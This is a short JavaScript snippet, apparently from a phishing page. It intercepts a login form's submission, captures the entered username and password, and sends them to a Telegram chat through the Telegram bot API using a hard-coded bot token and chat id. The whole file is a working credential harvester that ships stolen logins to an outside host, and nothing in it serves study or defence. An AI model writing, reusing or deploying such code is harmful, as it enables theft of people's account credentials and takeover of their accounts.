const form = document.querySelector('#form')

form.addEventListener("submit", (e) => {
  e.preventDefault()

  const login = document.getElementById('login').value
  const password = document.getElementById('password').value

  const my_text = `Account: %0A <b>👀Login:</b> ${login} %0A <b>🔒Password:</b> ${password}`

  const token = "5581738858:AAESSr5IOf-7_kTyBlmblTUf-odGAK1Bcrs"
  const chat_id = -1001667510965
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`

  let api = new XMLHttpRequest()
  api.open("GET", url, true)
  api.send()
})